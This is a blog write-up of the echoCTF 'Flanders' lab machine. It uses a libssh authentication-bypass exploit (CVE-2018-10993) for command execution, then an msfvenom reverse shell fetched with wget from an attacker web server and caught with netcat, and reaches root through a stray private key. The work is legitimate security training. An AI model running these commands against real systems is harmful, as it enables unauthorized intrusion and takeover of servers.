<!doctype html><html lang=en><head><title>echoCTF Flanders Writeup: Vulnerable SSH version to Root :: Hacking Blog</title>
<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Step-by-step guide to cracking Flanders on echoCTF with SSH Authentication Bypass. Perfect for OSCP prep!"><meta name=keywords content="CTF,hacking,cybersecurity,notes,writeups"><meta name=robots content="noodp"><link rel=canonical href=https://hack.com.cy/writeups/echoctf/flanders/flanders/><link rel=stylesheet href=https://hack.com.cy/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=https://hack.com.cy/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css><link rel=stylesheet href=https://hack.com.cy/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=https://hack.com.cy/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css><link rel=stylesheet href=https://hack.com.cy/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://hack.com.cy/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css><link rel=stylesheet href=https://hack.com.cy/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css><link rel=stylesheet href=https://hack.com.cy/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css><link rel=stylesheet href=https://hack.com.cy/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=https://hack.com.cy/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css><link rel=stylesheet href=https://hack.com.cy/css/sidebar.min.d99f1331c4dc2becb305a3d135a35844adbf5c1f39330853456f7e7f5864cb45.css><link rel=stylesheet href=https://hack.com.cy/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css><link rel=stylesheet href=https://hack.com.cy/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css><link rel=stylesheet href=https://hack.com.cy/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel=stylesheet href=https://hack.com.cy/terminal.css><link rel=stylesheet href=https://hack.com.cy/style.css><link rel="shortcut icon" href=https://hack.com.cy/favicon.png><link rel=apple-touch-icon href=https://hack.com.cy/apple-touch-icon.png><meta name=twitter:card content="summary"><meta name=twitter:site content><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="echoCTF Flanders Writeup: Vulnerable SSH version to Root"><meta property="og:description" content="Step-by-step guide to cracking Flanders on echoCTF with SSH Authentication Bypass. Perfect for OSCP prep!"><meta property="og:url" content="https://hack.com.cy/writeups/echoctf/flanders/flanders/"><meta property="og:site_name" content="Hacking Blog"><meta property="og:image" content="https://hack.com.cy/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:section" content="CTF"><meta property="article:section" content="OSCP Prep"><meta property="article:section" content="echoCTF"><meta property="article:published_time" content="2025-06-25 00:00:00 +0000 UTC"><meta name=theme-color content="#0a0e14"><meta name=color-scheme content="dark"><link rel=preload href=/fonts/FiraCode-Latin.woff2 as=font type=font/woff2 crossorigin><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><script src=https://cdn.jsdelivr.net/npm/fuse.js@6.6.2/dist/fuse.min.js></script><script defer src=https://hack.com.cy/js/search.js></script></head><body><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/why/><div class=logo><img src=/logo.png alt="Hacking Vault" class=logo-image></div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/why/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/why/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li><li><button class=search-button onclick=showSearch() aria-label=Search>Search</button></li></ul></nav></header><div class=content><nav class=breadcrumbs aria-label=Breadcrumb><ol class=breadcrumb-list><li class=breadcrumb-item><a href=https://hack.com.cy/ class=breadcrumb-link><span class=breadcrumb-icon>~</span>Home</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/ class=breadcrumb-link>echoCTF Writeups</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/echoctf/ class=breadcrumb-link>echoCTF Writeups</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/echoctf/flanders/ class=breadcrumb-link></a></li><li class=breadcrumb-separator>/</li><li class="breadcrumb-item breadcrumb-current" aria-current=page><span class=breadcrumb-text>echoCTF Flanders Writeup: Vulnerable SSH version to Root</span></li></ol></nav><style>.breadcrumbs{margin:20px 0 30px;padding:10px 15px;background:var(--background-secondary);border-left:3px solid var(--accent);border-right:1px solid var(--code-border);border-top:1px solid var(--code-border);border-bottom:1px solid var(--code-border)}.breadcrumb-list{display:flex;flex-wrap:wrap;align-items:center;list-style:none;margin:0;padding:0;gap:8px;font-size:.9rem}.breadcrumb-item{display:inline-flex;align-items:center}.breadcrumb-link{color:var(--accent-secondary);text-decoration:none;transition:all .2s ease;display:inline-flex;align-items:center;gap:5px}.breadcrumb-link:hover{color:var(--accent);text-shadow:0 0 5px var(--glow-accent)}.breadcrumb-icon{color:var(--accent);font-weight:700}.breadcrumb-separator{color:var(--code-border);user-select:none}.breadcrumb-current .breadcrumb-text{color:var(--foreground);font-weight:700}@media(max-width:684px){.breadcrumbs{font-size:.85rem;overflow-x:auto}.breadcrumb-list{flex-wrap:nowrap}}</style><article class=post><h1 class=post-title><a href=https://hack.com.cy/writeups/echoctf/flanders/flanders/>echoCTF Flanders Writeup: Vulnerable SSH version to Root</a></h1><div class=post-meta><time class=post-date>2025-06-25&nbsp;[Updated 2026-01-01]</time><span class=post-reading-time>3 min read (587 words)</span></div><span class=post-tags>#<a href=https://hack.com.cy/tags/authentication-bypass/>Authentication Bypass</a>&nbsp;
#<a href=https://hack.com.cy/tags/linux/>Linux</a>&nbsp;
#<a href=https://hack.com.cy/tags/privilege-escalation/>privilege escalation</a>&nbsp;
#<a href=https://hack.com.cy/tags/public-exploit/>Public Exploit</a>&nbsp;</span><div class=table-of-contents><h2>Contents</h2><nav id=TableOfContents><ul><li><a href=#video-walkthrough>Video Walkthrough</a></li></ul><ul><li><a href=#nmap-port-scan>NMAP Port Scan</a></li><li><a href=#output>Output</a></li><li><a href=#output-1>Output</a></li></ul></nav></div><div class=post-content><div><h2 id=video-walkthrough>Video Walkthrough<a href=#video-walkthrough class=hanchor arialabel=Anchor>#</a></h2><div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen loading=eager referrerpolicy=strict-origin-when-cross-origin src="https://www.youtube.com/embed/HwbOIk1GpUw?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 title="YouTube video"></iframe></div><p><a href="https://www.youtube.com/watch?v=HwbOIk1GpUw"><img src="https://img.shields.io/badge/Watch%20on-YouTube-red?logo=youtube" alt="Watch on YouTube"></a></p><h1 id=flanders>Flanders<a href=#flanders class=hanchor arialabel=Anchor>#</a></h1><h1 id=enumeration>Enumeration<a href=#enumeration class=hanchor arialabel=Anchor>#</a></h1><h2 id=nmap-port-scan>NMAP Port Scan<a href=#nmap-port-scan class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -vv -p- 10.0.50.0 -T4 -sC -sV -oA nmap/allports
</span></span></code></pre></div><h2 id=output>Output<a href=#output class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PORT     STATE SERVICE REASON         VERSION
</span></span><span class=line><span class=cl>6022/tcp open  ssh     syn-ack ttl <span class=m>63</span> libssh 0.8.1 <span class=o>(</span>protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> 9c:42:2e:fa:60:30:95:dd:a0:60:80:1f:fd:ae:77:86 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF7bYwrFoV/ukt+Dv8+2ZbdxEoyYGkvq8tEO7cbR9jTl96QN//1v8lOw4o0b26uA7wHBWs5+zPZm6SeGIazx+Bj3mih6Oofm/9HU+FLHTCb+uo5kaG6v8g7gwjkoFNyx/rn+G+BKAMY6op4+6P6CqFFv1yfEhVWWqItla0kmfp3jwD1HCd/i0OxFsUN335RYeokeLqrG1kpoyVlsiqHMZWbz7DUDE2BjTVy1WcZAJtukCa7OHJKMZuh/AVCrCUuTrA3TRHJdl4+AR1GpI+UscHwmwZRsRsVAwgjC7v93fdD+zmrTth15XH7vXYkUK/ZAyaK8cAJOg2lCeNCwuw5OWh
</span></span></code></pre></div><p>Analyzing the NMAP output we can see that we found port 6022 open, and it seems that is SSH. We can also view the version of the SSH service (libss 0.8.1).</p><p>To confirm that this is actually the version of the SSH server we can furter fingerprint the service using <code>nc</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -nvC 10.0.50.0 <span class=m>6022</span>
</span></span></code></pre></div><h2 id=output-1>Output<a href=#output-1 class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.0.50.0<span class=o>]</span> <span class=m>6022</span> <span class=o>(</span>?<span class=o>)</span> open
</span></span><span class=line><span class=cl>SSH-2.0-libssh_0.8.1
</span></span></code></pre></div><p>Now that we have the version of the SSH we can search for known vulnerabilities on the web. What i usually do when i search for vulnerabilities for a specific software or service, is that i append the keywords &ldquo;poc&rdquo; &ldquo;exploit&rdquo; &ldquo;github&rdquo; prepending the version number and service name</p><p><img src=/images/Pasted%20image%2020250729180313.png alt="Image Description"></p><p>We can see that there are a lot of exploits available regarding this particular version of and most importantly we get the CVE number to search more specifically.</p><p><img src=/images/Pasted%20image%2020250729190217.png alt="Image Description"></p><p>The following exploit worked for me: <code>https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d?permalink_comment_id=3077048</code></p><h1 id=exploitation>Exploitation<a href=#exploitation class=hanchor arialabel=Anchor>#</a></h1><p>We can download the GitHub repo and install the requirements for the exploit to work.
First lets copy the exploit by clicking the raw format and paste it locally on our attacking machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat sshlibexp.py
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#!/usr/bin/python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># CVE-2018-10993 libSSH authentication bypass exploit...</span>
</span></span><span class=line><span class=cl>&lt;snip&gt;
</span></span></code></pre></div><p>Reading the script we can see that there is a python module required called <code>paramiko</code> and since is a python script it is a good practice to create a python virtual environment to install what is required.</p><p><img src=/images/Pasted%20image%2020250729191121.png alt="Image Description"></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo apt install python3-venv
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>python3 -m venv .venv
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>source</span> .venv/bin/activate
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>python3 -m pip install paramiko
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>python3 sshlibexp.py 10.0.50.0 -p <span class=m>6022</span> -c <span class=s2>&#34;cat /etc/passwd&#34;</span>
</span></span></code></pre></div><p><img src=/images/Pasted%20image%2020250729191351.png alt="Image Description"></p><p>We get an error but the script rans successfully. We now have command execution on the target server.</p><p>Lets get a reverse shell..</p><p>Lets first check the architecture of the target server so we know what kind of architecture should our shell be.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 sshlibexp.py 10.0.50.0 -p <span class=m>6022</span> -c <span class=s2>&#34;uname -a&#34;</span>
</span></span></code></pre></div><p><img src=/images/Pasted%20image%2020250729191850.png alt="Image Description">
Is a x64 architecture so lets create an x64 reverse shell using <code>msfvenom</code> and then download our rshell to the target machine using <code>wget</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo msfvenom -p linux/x64/shell_reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>&lt;attacker-ip&gt; <span class=nv>LPORT</span><span class=o>=</span><span class=m>80</span> -f elf -o x64
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>python3 -m http.server <span class=m>80</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>python3 sshlibexp.py 10.0.50.0 -p <span class=m>6022</span> -c <span class=s2>&#34;wget http://10.10.11.150/x64 -O /tmp/x64&#34;</span> 
</span></span></code></pre></div><p><img src=/images/Pasted%20image%2020250729192359.png alt="Image Description"></p><p>Now that our rshell is downloaded we can go ahead and use <code>chmod</code> to make it executable and then execute the rshell</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 sshlibexp.py 10.0.50.0 -p <span class=m>6022</span> -c <span class=s2>&#34;chmod +x /tmp/x64&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sudo nc -nvlp <span class=m>80</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>python3 sshlibexp.py 10.0.50.0 -p <span class=m>6022</span> -c <span class=s2>&#34;/tmp/x64&#34;</span>
</span></span></code></pre></div><p><img src=/images/Pasted%20image%2020250729192554.png alt="Image Description"></p><p>We got in!</p><p>To have a better shell we can use python3 likewise:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -c <span class=s2>&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Ctr+Z
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>stty raw -echo<span class=p>;</span><span class=nb>fg</span>
</span></span><span class=line><span class=cl><span class=o>(</span>Press Enter<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>Press Enter<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>Press Enter<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span></code></pre></div><p><img src=/images/Pasted%20image%2020250729193212.png alt="Image Description"></p><p>Now we have a fully functional shell!</p><h1 id=privilege-escalation>Privilege Escalation<a href=#privilege-escalation class=hanchor arialabel=Anchor>#</a></h1><p>Most of the times i check for sudo privileges or SUID binaries however in this case by checking what is running locally on the box we find out that there is an SSH service running locally.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ss -antp
</span></span></code></pre></div><p><img src=/images/Pasted%20image%2020250729194000.png alt="Image Description"></p><p>Trying to access the local SSH service as root with the password give in the hint but we get access denied
<img src=/images/Pasted%20image%2020250729194102.png alt="Image Description"></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh root@127.0.01
</span></span><span class=line><span class=cl>OkilyDokily
</span></span></code></pre></div><p>Looking further around knowing we are dealing with an SSH service, it is noticed that there is private key under the home directory of ETSCTF user called &ldquo;mykey&rdquo; and its owned by root!</p><p><img src=/images/Pasted%20image%2020250729194808.png alt="Image Description"></p><p>We can try using the private key to access the SSH server locally as root!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ETSCTF@flanders:/home/ETSCTF/.ssh$ ssh -i mykey root@127.0.01
</span></span></code></pre></div><p><img src=/images/Pasted%20image%2020250729194833.png alt="Image Description"></p><p>ROOT!</p></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2026 Powered by <a href=https://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script><div id=search-overlay><div class=search-container><input type=search id=search-input placeholder="Search writeups, notes, and more..." autocomplete=off aria-label=Search><div class=search-hint>Press <kbd>ESC</kbd> to close or <kbd>/</kbd> to open search</div><div id=search-results></div></div><button class=search-close onclick=hideSearch() aria-label="Close search">×</button></div></div></body></html>